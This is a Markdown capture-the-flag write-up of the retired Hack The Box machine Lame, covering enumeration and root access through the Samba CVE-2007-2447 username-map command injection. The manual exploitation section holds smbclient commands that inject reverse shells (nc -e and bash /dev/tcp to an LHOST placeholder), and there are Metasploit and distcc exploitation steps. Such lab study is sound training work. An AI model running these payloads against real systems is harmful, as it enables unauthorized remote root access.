---
title: HTB — Lame
type: lab-writeup
platform: HTB
difficulty: foundational
os: Linux
status: Complete
date: 2026-03-24
tags:
  - foundational
  - lab
  - HTB
  - linux
  - samba
  - cve-2007-2447
  - usermap-script
  - smb
---

# HTB — Lame

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Machine | Lame |
| Difficulty | Easy |
| OS | Linux (Ubuntu 8.04 Hardy) |
| IP | 10.10.10.3 |
| Date | 2026-03-24 |
| Status | Retired — write-ups publicly sanctioned |

---

## Objectives

- [x] Enumerate open services
- [x] Identify vulnerable Samba version
- [x] Exploit CVE-2007-2447 for root access
- [x] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/lame_initial 10.10.10.3
```

**Open ports:**

| Port | Service | Version | Notes |
|---|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 | Anonymous login — rabbit hole |
| 22/tcp | SSH | OpenSSH 4.7p1 | Needs credentials |
| 139/tcp | netbios-ssn | Samba 3.0.20 | Attack surface |
| 445/tcp | microsoft-ds | Samba 3.0.20 | **Primary vector** |
| 3632/tcp | distccd | distcc v1 | Secondary vector (CVE-2004-2687) |

### FTP rabbit hole — why to skip it

vsftpd 2.3.4 has a known backdoor (CVE-2011-2523) that opens a shell on port 6200 when `:)` is in the username. On this specific machine, the backdoor is patched — port 6200 does not open. Anonymous login succeeds but the share is empty.

> **Lesson:** Enumerate all services before committing to any single vector.

---

## Vulnerability Background

**CVE-2007-2447 — Samba Username Map Script Command Injection**

| Field | Detail |
|---|---|
| CVE | CVE-2007-2447 |
| CVSS | 10.0 Critical |
| Affected | Samba 3.0.0 – 3.0.25rc3 |
| Type | Unauthenticated OS command injection via MS-RPC |
| Auth required | None |

**Root cause:** When the `username map script` smb.conf option is enabled, Samba passes the username to `/bin/sh` without sanitisation. Injecting shell metacharacters (backtick or `$()`) in the username triggers arbitrary command execution as the Samba process owner — root on this machine.

---

## Foothold

### Exploitation with Metasploit

```bash
msfconsole

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(...) > set RHOSTS 10.10.10.3
msf6 exploit(...) > set LHOST <YOUR_TUN0_IP>
msf6 exploit(...) > run
```

**Expected result:**

```
[*] Command shell session 1 opened
whoami
root
```

### Manual exploitation (OSCP prep — no Metasploit)

```bash
# Set up listener first
nc -lvnp 4444

# Inject reverse shell via SMB username field
smbclient //10.10.10.3/tmp \
  -U "./=\`nohup nc -e /bin/sh <LHOST> 4444\`"
```

**Alternative payload if nc -e unavailable:**

```bash
smbclient //10.10.10.3/tmp \
  -U "./=\`nohup bash -i >& /dev/tcp/<LHOST>/4444 0>&1\`"
```

---

## Privilege Escalation

Not required. Initial exploit yields root directly.

---

## Post-Exploitation

### Flag retrieval

```bash
cat /root/root.txt
ls /home/
cat /home/makis/user.txt
```

---

## Flags

| Flag | Path |
|---|---|
| User flag | `/home/makis/user.txt` |
| Root flag | `/root/root.txt` |

> Flag values omitted.

---

## Secondary Vector — distccd (CVE-2004-2687)

Port 3632 (`distcc`) is also exploitable. CVE-2004-2687 allows command execution via crafted compilation requests.

```bash
nmap --script distcc-exec --script-args="cmd='id'" -p 3632 10.10.10.3

# Metasploit
use exploit/unix/misc/distcc_exec
```

Good OSCP practice: always check all open ports. Real targets often have multiple paths.

---

## Key Takeaways

- CVE-2007-2447 shows how a single misconfigured smb.conf option (`username map script`) combined with absent input sanitisation leads to unauthenticated RCE
- Running network services as root eliminates the privesc barrier — defence: principle of least privilege
- Rabbit holes cost time — confirm exploitability with a probe before committing
- Manual `smbclient` exploit demonstrates the raw injection mechanism behind the Metasploit module

---

## Tools Used

- Nmap
- Metasploit
- Netcat

---

## References

- [NVD CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [Samba Security Advisory 2007-05-14](https://www.samba.org/samba/security/CVE-2007-2447.html)
- [HTB Lame Machine](https://www.hackthebox.com/machines/lame)

---
*Write-up completed: 2026-03-24*

## See Also

- Penetration-Testing-Methodology
- Metasploit
- Nmap
- Netcat
- Linux-Privilege-Escalation
- Common-Ports

---
<- [[Labs-MOC]]